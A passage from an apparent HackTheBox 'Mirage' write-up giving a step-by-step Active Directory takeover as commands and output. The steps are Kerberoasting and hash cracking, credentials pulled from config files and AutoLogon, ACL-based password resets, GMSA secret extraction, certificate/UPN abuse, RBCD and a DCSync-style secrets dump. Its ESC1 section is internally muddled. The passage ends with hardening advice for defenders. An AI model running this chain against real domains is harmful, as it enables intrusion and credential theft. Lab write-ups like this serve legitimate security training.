- `-k` tells BloodHound to use Kerberos tickets instead of password auth.
    
- `-c All` collects all available data: sessions, ACLs, trusts, etc.
    
- `--zip` outputs the compressed `.zip` file.
    

---

## 🔥 After download:

```bash
unzip 20250723205944_bloodhound.zip -d booddata
```

- List users with `jq`:

```bash
jq '.data[].Properties.name' booddata/20250723205944_users.json
```

📥 **Output**

```bash
❯ jq '.data[].Properties.name' booddata/20250723205944_users.json

"NT AUTHORITY@MIRAGE.HTB"
"MIRAGE-SERVICE$@MIRAGE.HTB"
"SVC_MIRAGE@MIRAGE.HTB"
"MARK.BBOND@MIRAGE.HTB"
"NATHAN.AADAM@MIRAGE.HTB"
"JAVIER.MMARSHALL@MIRAGE.HTB"
"KRBTGT@MIRAGE.HTB"
"DAVID.JJACKSON@MIRAGE.HTB"
"DEV_ACCOUNT_A@MIRAGE.HTB"
"ADMINISTRATOR@MIRAGE.HTB"
"DEV_ACCOUNT_B@MIRAGE.HTB"
"GUEST@MIRAGE.HTB"
```

> _"Kerberos gives you stealth. BloodHound gives you the map."_ 🗺️  
> _Combine both, and you own the shadows._

## 🎯 Goal: Extract TGT for `david.jjackson`

We want to **grab the TGT** (Ticket Granting Ticket) for `david.jjackson` from the DC using `impacket-getTGT`

```bash
impacket-getTGT -dc-ip 10.10.11.78 MIRAGE.HTB/david.jjackson:'pN8kQmn6b86!1234@'
```

📦 This drops:

```bash
[*] Saving ticket in david.jjackson.ccache
```

✅ **TGT acquired** → `david.jjackson.ccache`

We can now export and use it to enumerate SPNs (or anything else):

```bash
export KRB5CCNAME=david.jjackson.ccache

impacket-GetUserSPNs 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request
```

📥 **Output**

```bash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 17:18:18.584667  2025-07-23 18:14:59.856852             



$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$94eb794f3871990f0e4032d9b247f255$f13061bbfc9affaa988b10d933aea893cd40313115c59e9ea0760bb3c168b4a3f1b95b4a5a861d36eea7d335137155b5db8be6037131b7c1d8850b13240d5383fd827ab7ebde18b0709a3be7a00c7ad7c66119fff473991d8d7eaf45bbaad3e55bd55d2317e2a97366a4590790b4b411f853aae54d9f989ff171871717542a3e8c3338701bd4181861a3f7ae9f7d9cc05319144182ab7fea3276481f334cc87db4abdc4ab1ff56f42373f55b6163e2361c3059cd9dd6399a0b274de555da445e7db521a3a95abfbc5311fe61f14def47f85830bfeda7ba2f7439a6c8b83724096deb84a2be94256cfa7d3d2694a90e2d3df6db3e84fbc6ed27ece62dc180cfcb5e273a8afd4e740880eaa6c4737073aac6957ba043a2d1e3ccf1ca393d90d637fc8d56e76451de4c784dac2f91461dfc2eefeefd7784f3a23a152e0737af02ca3075a384c04f1ae8ccfd04f1571cc512f3689cd04f385ac643d2e71f60a79f5a37c53c8928e5993241dfdbdb5e8234f984e8b33c20a8d70176301384380bdc7614c724963b07a2298e6ad2574ef1978fd6bd3693901c311b7a46c2f62f81286a3d3d4326a185eb3dae62c314ab7989e8acf740037eb06474ac1f6e7de9ede477b16a9339ee12d9614e3dfe4aac51bcd053bbd9660506e835b2ea07b56969c28f41c1c9113ab8bcef4837d6cf627717392fe4c2a83e36ec46721a911c4b89d58f97f0a6dc7c3568a83af7038ce648aef26dac22393f018bb923dae2386dff21f6c270426825f65c3494b272ad2cacd98a0df6b3ba513a45f5e96ee47d3a72fb21387f21ecafca090c704e4c5ed482244daeec458c2def0b72bb7e9e245c7aa610ce29dc52d3ae73d64c305399f39ed3030002fcdf007e2106799b9a09d998d20b6acf8cb8b4370116b12067013ce6f04db796aea33e5343c3f7acb8b2669d1815ef73af1bdb3cdceffa575ab940ed09868adaed39e0197cb8309c64ea590a59fb1b52482298914308cb083fb95d5f49057a781ec954f1d0d1b89a5bf8a4fc69c34fafa7a03a69867eca8e94c4952c9bcd568bcc55cec0610cb08a8e7988d30f6d0e002d919e2fccc5aec9aa81804562d980535610f7069e24d880c4b5d60c8f3e139a0bc84ee06f3863004ccada7dc9ac066f5f1ff27dc15295d36191bbb0a67ce2d287df7c92fe54dcb1899cc6cedd296e8ed771c7f82373f4f1f23c791bf51fcfafbb16ca9bad28bc6a4ba382d4979f0fb396e32eb00e93c0741b2441465456a2c5e3fb46206475645f99aa785d746ae2e5babc180328e4cdf074985bd3640987285a5442eee8bd9d32a0893bdbe297f45e06015d75e470faf82938220429d3b0a27d240fa17802617e590839ce797b1ebdbd71ef20561a91f8cb85f8431352b9df64335337357c4af2e72e3cb2d4915bc61e80e632e2679936215302d68d13e0821975d5e410ed16abbc405dfe34f86df320cb7bd1cca8ec043ad1d4dcfef133d598d554865b7603df54243a64ed90cc1473fe0727b32456efd48d7e50df03613ed43029b4508f87001d3e5ee9c513e9d141c18b50fc0401
```

💥 Result: You’ll extract a TGS (SPN hash) like this:

```bash
$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$HTTP/exchange.mirage.htb$...
```

Copy the full SPN hash into a file

```bash
❯ echo '$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$94eb794f3871990f0e4032d9b247f255$f13061bbfc9affaa988b10d933aea893cd40[...]' > spn_hash.txt
```

- Prepare John with the right format
    
- John supports these Kerberos TGS hashes via the `krb5tgs` format. Confirm it:

```bash
john --list=formats | grep krb5tgs
```

We see: `krb5tgs, krb5tgs: Kerberos 5 TGS-REP etype 23`

- Start cracking
    
- Use a good wordlist like `rockyou.txt` or a custom one:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs spn_hash.txt
```

💡 **Tips:**

- We can use my custom keyboard walk list I think it's a weak password.
    
- Add `--fork=4` to parallelize on 4 cores.
    
- Show cracked password

```bash
john --show --format=krb5tgs spn_hash.txt
```

📥 **Output**

```bash
❯ john --show spn_hash.txt

?:3edc#EDC3

1 password hash cracked, 0 left
```
## ✅ User Access Achieved

> 🔓 **Recovered Credentials** → `nathan.aadam : 3edc#EDC3`

### 🎟 Extract TGT Ticket

```bash
❯ impacket-getTGT -dc-ip 10.10.11.78 mirage.htb/nathan.aadam:'3edc#EDC3'
[*] Saving ticket in nathan.aadam.ccache
❯ export KRB5CCNAME=nathan.aadam.ccache
```

### 🖥️ Kerberos Shell Access

```bash
evil-winrm -i dc01.mirage.htb -r mirage.htb
```

### 📝 Proof of Access

```powershell
PS C:\Users\nathan.aadam\Documents> type C:\Users\nathan.aadam\Desktop\user.txt
cbb39f897aa4a2ae2599567a5e14xxxxx
```

Now that we’ve **secured a foothold**, let’s **move forward to escalate privileges**. 🔍🧠

### 👥 Enumerate All Domain Users

No guesswork — straight pull from AD:

```powershell
Get-ADUser -Filter * -Properties SamAccountName | Select-Object SamAccountName
```

📋 **Result**:

```
Administrator
Guest
krbtgt
Dev_Account_A
Dev_Account_B
david.jjackson
javier.mmarshall
mark.bbond
nathan.aadam
svc_mirage
```

### ❌ Disabled Account Detected

Upon checking `javier.mmarshall` (previously tested), we confirm the account is **disabled**:

```powershell
Get-ADUser -Identity javier.mmarshall -Properties Enabled | Select SamAccountName, Enabled
```

📤 **Output**

```sql
SamAccountName     Enabled
--------------     -------
javier.mmarshall   False
```
🧠 So this user is **dead weight** for privilege escalation. Let's pivot to real access.

🧠 **Noteworthy**:

- `svc_mirage`: Likely a **service account** → potential privilege or delegation
    
- `javier.mmarshall`: ✅ Found, but **disabled**
    
- `mark.bbond`: Will become relevant shortly...
    

### 🔐 Credentials Leak – NATS Configuration

Found in a config file under `C:\Program Files\Nats-Server\`:

```powershell
type 'C:\Program Files\Nats-Server\nats-server.conf'
```

🧾 **Leaked Accounts**:

|Account Scope|Username|Password|
|---|---|---|
|$SYS|`sysadmin`|`bb5M0k5XWIGD`|
|dev|`Dev_Account_A`|`hx5h7F5554fP@1337!`|
|dev|`Dev_Account_B`|`tvPFGAzdsJfHzbRJ`|

All 3 appear in AD let’s keep them for lateral movement or shell pivot.

### 🪪 Registry Recon – AutoLogin Secrets

The goldmine came from the registry. AutoLogon revealed clear-text credentials:

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
```

💥 **Recovered Login:**

|User|Domain|Password|AutoLogin|
|---|---|---|---|
|`mark.bbond`|MIRAGE|`1day@atime`|✅ Enabled|

🔓 That’s a **clear text credential** for another domain user with potentially elevated access.

💡 So what do we do now?
### 🎫 Forge a Ticket (TGT) – Claiming Identity

Once we have the username (`mark.bbond`) and his password (`1day@atime`), we don't just **log in manually** we **go native with Kerberos**.

```bash
impacket-getTGT -dc-ip 10.10.11.78 mirage.htb/mark.bbond:'1day@atime'
export KRB5CCNAME=mark.bbond.ccache
```

### 🧠 Understanding the Mission: Pivot to Power

We’re not just collecting creds and users randomly — we’re **mapping the domain** to:

- 📌 **Identify usable accounts**
    
- 🔒 **Understand privilege boundaries**
    
- 🔁 **Find paths to escalation**
    

Active Directory (AD) is like a social network  every user belongs to groups, and those groups define what they can or can’t do. So when we leak or capture a user credential, we always ask:

> _“What’s their power? Who do they know? Where can they go?”_

---

### 🧪 Mark.BBond: From Registry to Weapon

We found **Mark’s creds** in plain text via `AutoAdminLogon`. That's not just lucky — **it's real-world misconfiguration** we exploit in red teaming often.

We log in as `mark.bbond` because:

- ✅ His creds work.
    
- 🔓 He’s **not disabled**.
    
- 🔧 He has **just enough rights** to touch other users (you'll see why this matters).
    

Now comes the strategic move.

---

### 🩸 Weaponizing BloodyAD: Why We Change Passwords

We **don’t need Javier's original password**. We’re **Mark now**, and Mark has **delegated rights** (misconfigured, probably by a lazy sysadmin) to modify Javier's account.

🔧 So we **force reset** Javier’s password — _not because we cracked it_, but because **we control him** indirectly.

```bash
bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' set password JAVIER.MMARSHALL 'p@$$w0rd'
```

**Why this works**:

- 🎯 We're abusing ACL rights in AD.
    
- 🔁 We don’t need to know his current password.
    
- ⚡ We gain control without touching the keyboard of the victim.
    

---

### ⚠️ But He’s Disabled?

Exactly. That’s the catch most rookies miss.

AD has flags like `ACCOUNTDISABLE` that render a user account **inactive** even with correct credentials. So we take the next move...

---

### 🛠️ Re-enabling the Account

```bash
bloodyAD --host dc01.mirage.htb --dc-ip 10.10.11.78 -d mirage.htb -k remove uac JAVIER.MMARSHALL -f ACCOUNTDISABLE
```

💡 _Why we do this_: Resetting a password is useless if the user is **disabled**. This command brings Javier **back to life**.

- Check if `javier.mmarshall` is Enabled

Using **bloodyAD** to validate the target state before any action:

```bash
bloodyAD --kerberos -u "mark.bbond" -p '1day@atime' -d "mirage.htb" --host "dc01.mirage.htb" get object "javier.mmarshall" --attr userAccountControl 
```

📤 **Result**

```bash
distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: NORMAL_ACCOUNT
```

🧠 _This means `javier.mmarshall` is unlocked.

---

### 🧪 Extracting Secrets: msDS-ManagedPassword

Now, with Javier **enabled** and his new creds in our pocket, we abuse a goldmine of AD:

```bash
bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'javier.mmarshall' -p 'p@$$w0rd' get object 'Mirage-Service$' --attr msDS-ManagedPassword
```

📤 **NTLM hash result:**

```bash
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaxxxxxxxxxx
```
💣 Boom! We leak **Managed Service Account (MSA)** secrets, including:

- 🔑 NTLM hash
    
- 📦 B64-encoded managed password blob
    

MSAs are often **high-privilege**, used in automation, and **don’t rotate passwords like humans do**.

---

### 🎟️ Turning Hash to Ticket (Kerberos TGT)

```bash
❯ impacket-getTGT mirage.htb/Mirage-Service\$ -hashes :305806d84f7c1be93a07aaxxxxxxxxxx
❯ export KRB5CCNAME=Mirage-Service\$.ccache
```

We grab a **Kerberos ticket-granting ticket (TGT)** using the NTLM hash. This means:

- 🪪 We now impersonate `Mirage-Service$`
    
- 🎫 We can **access services or escalate**, depending on trust levels
    

---

### 🧠 Final Thought: Why It Works

This whole chain isn't random. It’s a **step-by-step walk** through:

1. 🧾 Leaked creds from misconfigs
    
2. 🎣 ACL abuse to reset others' passwords
    
3. 🔄 Re-enabling disabled but privileged users
    
4. 🩸 Dumping MSA secrets
    
5. 🕶️ Becoming a **service with privilege**
    

Each move was **intentional**, based on **rights, relationships, and reachable users**. That’s the hacker mindset.

> ❝ We don’t guess. We pivot. We read the directory like a story — and we write our name in its ending. ❞

### ✅ **Recap of Current Status**

We’ve:

- 🧠 Extracted the NTLM hash of `Mirage-Service$`
    
- 🏷️ Got its TGT via `impacket-getTGT`
    
- 🪪 Set `KRB5CCNAME=Mirage-Service$.ccache`
    

Now you have a legit service account TGT to act on behalf of that identity. Let’s **move to privilege escalation**.

---

## 🔓 Path 1: ESC1 - Abuse Certificate Templates

If `Mirage-Service$` has rights to write `altSecurityIdentities`, we can **weaponize certificate auth** for **any user**.

### 🔧 Step 1: Add `altSecurityIdentities` for a target user

Set `altSecurityIdentities` for `mark.bbond` to something we control:

```bash
certipy-ad account -u 'Mirage-Service$@mirage.htb' \
-k -no-pass \
-dc-ip 10.10.11.78 \
-target dc01.mirage.htb \
-user 'mark.bbond' \
-upn 'dc01$@mirage.htb' update
```

💡 This maps `mark.bbond` to the UPN of `Mirage-Service$` – a trick to **steal their identity via certificates**.

---

### 📄 Step 2: Request a Certificate as `mark.bbond`

Still using your current TGT (or generate new one via impersonation), request a cert:

```bash
export KRB5CCNAME=mark.bbond.ccache

certipy-ad req -u 'mark.bbond@mirage.htb' \
-k -no-pass \
-dc-ip 10.10.11.78 \
-target 'dc01.mirage.htb' \
-ca 'mirage-DC01-CA' \
-template 'User'
```

This gives you `dc01.pfx`.

- Spoof `mark.bbond`'s Identity via UPN Injection

Use your valid TGT for `Mirage-Service$` to map `mark.bbond` to a UPN you control allowing impersonation via certificate authentication.

```bash
export KRB5CCNAME=Mirage-Service$.ccache

certipy-ad account \
  -u 'Mirage-Service$' \
  -k \
  -target dc01.mirage.htb \
  -upn 'mark.bbond@mirage.htb' \
  -user 'mark.bbond' update \
  -dc-ip 10.10.11.78
```

✔️ This maps `mark.bbond`'s `userPrincipalName` to our controlled account `Mirage-Service$@mirage.htb`.

---

### 🎟️ Step 3: Authenticate with the Cert

```bash
certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
```

Boom — you're now in as **`mark.bbond` via certificate-based authentication**.

From here, you can do:

- `set_rbcd`
    
- `dcsync`
    
- `dump hashes`
    
- or escalate further if needed.
    

---

## 🛠️ Alternate Path: RBCD Attack

If you've already done the cert abuse and are inside LDAP-shell **as mark.bbond**, you can now:

### 🧬 Set RBCD on DC01 to another account (e.g., `nathan.aadam` or even `Mirage-Service$`):

```bash
set_rbcd dc01$ Mirage-Service$
```

This allows `Mirage-Service$` to impersonate any user _to_ `dc01`.

- Get a Service Ticket (ST) as `dc01$`

Now use `Mirage-Service$`’s NTLM hash to impersonate `dc01$` and obtain a service ticket to CIFS:

```bash
❯ impacket-getST -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.78  'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaxxxxxxxxxx
```

```bash
❯ export KRB5CCNAME=dc01\$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
```

- Dump All Domain Secrets 🧠

Now that you can act **as `dc01$`**, dump the secrets from the domain controller:

```bash
impacket-secretsdump -k -no-pass dc01.mirage.htb
```

📤 **Result**

We’ll receive the full dump of credentials, including **Administrator**, **krbtgt**, and all user accounts:

```plaintext
mirage.htb\Administrator:500:...:7be6d4f3c2b9c0e3xxxxxxxxxxxxxxxx:::
krbtgt:502:...:1adcc3d4a7f007ca8xxxxxxxxxxxxxxxx:::
mirage.htb\mark.bbond:1109:...:8fe1f7f9e9148b3bdeb3xxxxxxxxxxxxxxx:::
mirage.htb\nathan.aadam:1110:...:1cdd3c6d19586fd3a8120xxxxxxxxxxxxxxx:::
...
Mirage-Service$:1112:...:305806d84f7c1be93a07aaxxxxxxxxxx:::
```

🔓 We're now holding the **keys to the kingdom**, including NTLM and AES keys for every domain user.

### 💀🔓 Full Compromise — Log in as `Administrator`

With the NTLM hash of the domain administrator (`7be6d4f3c2b9c0e3560f5a29eeb1afb3`) in hand, we request a **Ticket Granting Ticket (TGT)** for the `Administrator` account:

```bash
❯ impacket-getTGT mirage.htb/Administrator -hashes :7be6d4f3c2b9c0e3xxxxxxxxxxxxxxxx
[*] Saving ticket in Administrator.ccache
```

Set the Kerberos environment:

```bash
export KRB5CCNAME=Administrator.ccache
```

Now authenticate interactively to the domain controller using `evil-winrm`:

```bash
evil-winrm -i dc01.mirage.htb -r MIRAGE.HTB
```

And finally, grab the crown jewel:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
cb99bbac80b51c38666axxxxxxxxxxxxxx
```

---

🧠 **Mindset**:

> _"Kerberos is your battleground, hashes are your weapons, and tickets are your keys. Once you own the trust, you own the kingdom."_

## 📈 Vulnerabilities Abused

|Misconfig|Description|
|---|---|
|NFS Export|World-readable files leaked AD internals|
|DNS Scavenging|Allowed spoofing `nats-svc`|
|Cleartext NATS Auth|Stolen creds from service|
|Weak ACLs|Javier reset + enabled|
|AutoLogon|Plaintext password stored|
|msDS-ManagedPassword|MSA secrets extractable|
|Certificate Template|ESC1 abuse via altSecurityIdentities|
|RBCD|Pivot to DC and DCSync attack|
## 🏛️ Defense & Hardening Practices

- ❌ Disable AutoAdminLogon
    
- ❌ Audit certificate templates monthly
    
- ❌ Block user-supplied subject names
    
- ❌ Rotate service account passwords
    
- ❌ Restrict LDAP bind & Kerberos delegation
    
- ✅ Harden JetStream/NATS with TLS & auth zones
    
- ✅ Monitor AD object ACLs (with BloodHound)
    
- ✅ Apply Microsoft ESC mitigations:
    
    - [https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-prevent-users-request-certificate](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-prevent-users-request-certificate)
        
    - [https://www.adcs-security.com/blog/understanding-esc1](https://www.adcs-security.com/blog/understanding-esc1)
        

## 🎤 My Message to Blue Teams

> "This wasn’t about popping a box this was about **understanding the network’s language**. AD isn’t a wall you break it’s a forest you navigate. Every misconfig was a whisper from the domain saying, 'I trust too much.'
> 
> So patch the silence. Audit the paths. Lock down the shadows. Because if I got in this deep... someone else will too."

**Written by a ghost in the directory.**